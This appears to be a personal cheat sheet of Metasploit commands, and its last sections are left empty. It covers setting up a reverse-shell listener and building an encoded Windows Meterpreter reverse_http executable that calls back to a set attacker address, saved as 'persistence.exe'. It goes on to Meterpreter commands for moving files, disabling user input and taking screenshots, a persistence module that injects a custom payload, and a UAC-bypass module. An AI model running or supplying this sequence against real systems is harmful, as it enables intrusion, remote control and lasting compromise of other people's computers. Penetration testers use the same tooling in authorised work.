installation
==============
- apt-get install metasploit-framework
- /opt/metasploit-framework/bin/msfconsole
- /opt/metasploit-framework/bin/msfdb
- msfdb init

start the program
====================
- service postgresql start
- service metasploit start
- msfconsole

update
========
- msfupdate
- apt-get dist-upgrade

search
========
- search -h

use
====
- use exploit/multi/handler
- set PAYLOAD windows/x64/meterpreter/reverse_http
- show options
- set/unset _options
- run

create encrypted payload with msfvenum
========================================
- msfvenom --help-format
- msfvenom -l encoders
- msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_http LPORT=8080 LHOST=10.0.0.6 -f exe -e x86/shikata_ga_nai  -i 4 -b '\x00\xff' > ~/Desktop/persistence.exe


metepreter
============
- upload _linux_path_and_file(or just home_dir) _win_path 
- download _file
- execute -f _app.exe(in the directory)
- uictl dis/enable _I/O
- screenshot
- ps

persist connection
==================
- after session is created 
- background 
- use exploit/windows/local/persistence 
- set exe_name connection_services
- set session _id
- show advanced
- set exe::custom /var/lib/veil/output/compiled/post-exploit.exe (specify payload to inject)
- run

acquire admin priviledges (lower than 10)
===========================================
- use exploit/windows/local/bypassuac_injection (PSH)
- 



show target and set target
=============================








